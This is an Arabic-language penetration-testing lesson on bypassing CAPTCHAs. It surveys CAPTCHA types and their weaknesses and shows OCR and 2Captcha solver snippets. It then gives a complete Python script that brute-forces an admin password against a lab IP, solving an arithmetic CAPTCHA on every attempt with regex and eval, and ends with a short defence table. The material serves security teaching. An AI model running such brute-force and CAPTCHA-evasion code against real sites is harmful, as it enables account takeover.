


# 🎯 CAPTCHA Bypass — من الفكرة للتنفيذ

---

## 📌 الصورة الكبيرة — الـ CAPTCHA موجود ليه؟

لما عملنا الـ Brute Force في الدرس اللي فات — الـ application لاحظ إن فيه requests كتير جداً بتيجي بسرعة.

عشان يحمي نفسه، الـ developer حط **CAPTCHA** (كابتشا) — وهي اختصار لـ: **Completely Automated Public Turing test to tell Computers and Humans Apart** (اختبار تورينج العام المؤتمت الكامل للتمييز بين الحاسوب والإنسان)

النطق: **كاب-تشا**

الفكرة: إنك تثبت إنك إنسان مش بوت — عشان يمنع الـ automated attacks.

---

## 🧠 ليه الـ CAPTCHA ممكن يتبايبس؟

مش كل الـ CAPTCHAs متساوية في القوة.

زي ما اتكلمنا في المحاضرة — في أنواع ضعيفة وأنواع قوية.

**القاعدة العملية:**

> كل ما الـ CAPTCHA أبسط منطقياً — كل ما الـتمتة (Automation) أسهل تكسره.

---

## 📊 أنواع الـ CAPTCHA من الأضعف للأقوى — مع طريقة الـ Bypass لكل واحد

---

### النوع الأول — Arithmetic CAPTCHA (الكابتشا الحسابية) ❌ ضعيف جداً

**شكله:** `3 + 7 = ?`

**ليه ضعيف؟** لأن الـ logic بتاعته موجود في الـ HTML نفسه — يعني الـ server بيبعت السؤال والجواب للـ browser، والـ browser هو اللي بيعمل الحسابة.

**طريقة الـ Bypass:** بالظبط زي الكود اللي الدكتور بعتهولك:

1. بتجيب الـ page بـ `GET` request
2. بتشيل المعادلة من الـ HTML بـ **Regex** (ريجكس — نمط بحث في النصوص)
3. بتحلها بـ `eval()` في Python
4. بتبعتها مع الـ login request

**ليه `eval()` بتشتغل؟** لأن `eval("3 + 7")` في Python بترجع `10` — يعني Python نفسها بتحل المعادلة.

الكود اللي الدكتور بعته بيعمل بالظبط ده.

---

### النوع التاني — Text-based CAPTCHA (نصي مشوه) ⚠️ أساسي

**شكله:** صورة فيها حروف مشوهة زي `xK7pQ`

**ليه ممكن يتبايبس؟** لأن فيه تقنية اسمها **OCR** — اختصار لـ **Optical Character Recognition** (التعرف البصري على الحروف) — النطق: **أو-سي-آر**.

الـ OCR بتقرأ النص من الصور.

**طريقة الـ Bypass:**

**الطريقة 1 — OCR Libraries:**

```python
from PIL import Image
import pytesseract

# جيب صورة الـ CAPTCHA
captcha_img = session.get('http://target.com/captcha.png').content

# احفظها ملف
with open('captcha.png', 'wb') as f:
    f.write(captcha_img)

# اقراها بـ OCR
captcha_text = pytesseract.image_to_string(Image.open('captcha.png'))
print(captcha_text)  # هيطبع النص اللي في الصورة
```

**الطريقة 2 — CAPTCHA Solving Services:** خدمات زي **2Captcha** (تو-كابتشا) و **AntiCaptcha** — بتبعتلهم الصورة وبيرجعوا الجواب خلال ثواني.

بشر حقيقيين بيحلوا الـ CAPTCHAs مقابل فلوس قليلة.

```python
from twocaptcha import TwoCaptcha

solver = TwoCaptcha('YOUR_API_KEY')
result = solver.normal('captcha.png')
captcha_text = result['code']
```

---

### النوع التالت — Image-based CAPTCHA (صور) ⚠️ متوسط

**شكله:** "اختار كل الصور اللي فيها إشارات مرور"

**ليه ممكن يتبايبس؟** الـ **Machine Learning** (التعلم الآلي) — النطق: **ماشين ليرنينج** — دلوقتي بقى يقدر يتعرف على الأشياء في الصور بدقة عالية.

**طريقة الـ Bypass:**

- نماذج زي **YOLO** أو **TensorFlow** للـ object detection (اكتشاف الأشياء في الصور)
- أو تاني استخدام **2Captcha** — بيدعم النوع ده كمان

**عملياً في الـ pentest:** الـ 2Captcha هو الأسرع والأسهل.

---

### النوع الرابع — reCAPTCHA v2 ✅ متوسط لقوي

**شكله:** checkbox "I'm not a robot" — وأحياناً بعده صور.

**طريقة الـ Bypass:**

**الطريقة 1 — 2Captcha API:**

```python
from twocaptcha import TwoCaptcha

solver = TwoCaptcha('YOUR_API_KEY')
result = solver.recaptcha(
    sitekey='SITE_KEY_من_الـ_HTML',
    url='http://target.com/login'
)
token = result['code']
# بعت الـ token مع الـ form
```

**الطريقة 2 — Selenium مع Browser Automation:** الـ **Selenium** (سيلينيوم) هو tool بيتحكم في الـ browser تلقائياً — زي إنك بتشغل browser من الكود.

بعض الـ reCAPTCHA v2 implementations الضعيفة بتنخدع بـ Selenium لأن السلوك بيبان إنساني.

---

### النوع الخامس — reCAPTCHA v3 🔒 قوي جداً

**شكله:** مفيش user interaction خالص — بيشتغل في الخلفية.

بيحسب **score** (درجة) من 0 لـ 1 بناءً على سلوكك على الموقع.

- `1.0` = إنسان أكيد
- `0.0` = بوت أكيد

**طريقة الـ Bypass:** صعب جداً — محتاج تجمع:

- **Residential Proxies** (بروكسيز سكنية) — IPs حقيقية مش Data Center
- **Browser fingerprinting** (بصمة المتصفح) طبيعية
- سلوك بشري حقيقي على الموقع

**عملياً في الـ pentest:** لو الموقع عنده reCAPTCHA v3 مضبوط صح — الـ automated brute force صعب جداً.

---

## 🛠️ التنفيذ العملي — الـ Burp Suite والـ CAPTCHA

### طريقة 1 — Manual CAPTCHA Solving مع Burp Intruder

لو الـ CAPTCHA صعب يتبايبس أوتوماتيك — فيه trick في Burp:

1. افتح Burp وامسك الـ request
2. في الـ Intruder — حط position على الـ password بس
3. في **Options** → **Request Engine** → قلل الـ threads لـ 1
4. في **Options** → **Grep - Match** → حط الـ error string
5. شغّل الـ attack — وكل request بيتبعت إنت بتحل الـ CAPTCHA يدوياً في الـ browser

**مش عملي على scale كبير** — بس مفيد لاختبار الـ logic.

---

### طريقة 2 — Burp Extension: CAPTCHA Killer

في الـ **BApp Store** (متجر الـ Extensions في Burp) — فيه extensions زي:

- **CAPTCHA Killer** — بيتكامل مع 2Captcha تلقائياً
- **Image Location and Privacy** — بيساعد في تحليل الـ CAPTCHA images

---

### طريقة 3 — Python Script زي الكود اللي الدكتور بعته

ده المنهج الأقوى والأمتع — لأنك بتكتب الـ logic بنفسك وبتفهم كل خطوة.

---

## 🧪 سيناريو كامل — Arithmetic CAPTCHA Bypass + Brute Force

**الهدف:** `http://192.133.218.3`

**الـ HTML بتاع الـ CAPTCHA:**

```html
<h4 style="text-align: center;margin-top: 4px">5 * 3 = </h4>
```

**الكود:**

```python
import re
import requests

session = requests.Session()

# الـ regex بيدور على المعادلة في الـ HTML
regex = '<h4 style="text-align: center;margin-top: 4px">(.*?) = </h4>'

with open('passwords.txt', 'r') as f:
    for password in f:
        password = password.rstrip()

        # جيب الـ page عشان تاخد الـ CAPTCHA والـ Cookie
        response = session.get('http://192.133.218.3')

        # استخرج المعادلة
        output = re.search(regex, response.text)

        # خد الـ Cookies
        cookies = session.cookies.get_dict()

        # حل المعادلة تلقائياً
        captcha = eval(output.group(1))

        print("Trying Password: " + password)

        # ابعت الـ Login Request
        data = {"username": "admin", "password": password, "captcha": captcha}
        output = session.post('http://192.133.218.3/login', cookies=cookies, data=data)

        # لو مفيش Error → الـ Login نجح
        if "Error" not in output.text:
            print("Password Found: " + password)
            break
```

**الـ Flow:**

```
Loop على كل password:
    GET /  →  جيب الـ CAPTCHA الجديدة + الـ Cookie
    Regex  →  استخرج المعادلة "5 * 3"
    eval() →  حل المعادلة = 15
    POST /login  →  admin + password + captcha=15 + cookie
    لو "Error" مش موجود → PASSWORD FOUND!
```

---

## ⚠️ نقطة مهمة — ليه بياخد الـ Cookie في كل loop؟

الـ Server بيربط الـ CAPTCHA بالـ Cookie بتاعة الـ Session.

يعني لو حليت المعادلة بس مبعتش نفس الـ Cookie → السيرفر مش هيعرف إن الـ CAPTCHA دي بتاعتك → هيرفض.

ولو استخدمت نفس الـ Cookie أكتر من مرة → السيرفر بيعرف إن الـ CAPTCHA اتحلت قبل كده → هيطلب واحدة جديدة.

عشان كده كل loop: Cookie جديدة + CAPTCHA جديدة + Solution جديد.

---

## 🔒 الدفاع — ليه الـ Arithmetic CAPTCHA مش كفاية

|المشكلة|الحل الصح|
|---|---|
|المعادلة في الـ HTML نفسه|السيرفر يحتفظ بالـ solution عنده بس|
|`eval()` بتحل أي حسابة|استخدام Image-based CAPTCHA|
|مفيش complexity|reCAPTCHA v3|
|مفيش rate limiting|تحديد المحاولات + lockout|

---

## 📋 مصطلحات الدرس في سياقها

|English Term|المعنى|النطق|
|---|---|---|
|CAPTCHA|اختبار التمييز بين الإنسان والبوت|كاب-تشا|
|OCR|التعرف البصري على الحروف من الصور|أو-سي-آر|
|Automation|الأتمتة — تنفيذ تلقائي|أوتوميشن|
|Selenium|أداة automation للـ browser|سيلينيوم|
|Machine Learning|التعلم الآلي|ماشين ليرنينج|
|Object Detection|اكتشاف الأشياء في الصور|أوبجكت ديتكشن|
|2Captcha|خدمة حل الـ CAPTCHAs|تو-كابتشا|
|API Key|مفتاح الوصول للـ API|إيه-بي-آي كي|
|reCAPTCHA|نظام Google للتحقق|ري-كابتشا|
|Score|درجة احتمال كون المستخدم إنسان|—|
|Residential Proxy|بروكسي بـ IP سكني حقيقي|ريزيدنشال بروكسي|
|Browser Fingerprint|بصمة المتصفح الفريدة|براوزر فينجربرينت|
|BApp Store|متجر الـ Extensions في Burp Suite|بي-آب ستور|
|Regex|نمط بحث في النصوص|ريجكس|
|eval()|دالة Python بتنفذ string كـ code|إيفال|

---

## ✅ ملخص الفكرة العملية

> الـ CAPTCHA Bypass مش magic — هو فهم إن كل CAPTCHA عندها weakness معينة. الـ Arithmetic CAPTCHA ضعيف لأن الـ logic بتاعته في الـ HTML — فـ regex + eval() بيكسره. الـ Text-based بيتكسر بـ OCR. الـ Image-based بـ ML أو 2Captcha. الأقوى هو reCAPTCHA v3 لأنه بيحلل السلوك — مش بس الـ input.

---

**الخطوة الجاية:** الـ Parameter Manipulation — إزاي تبايبس الـ Authentication بتغيير قيم في الـ request من غير ما تعرف الـ password أصلاً.

نكمل؟

</div>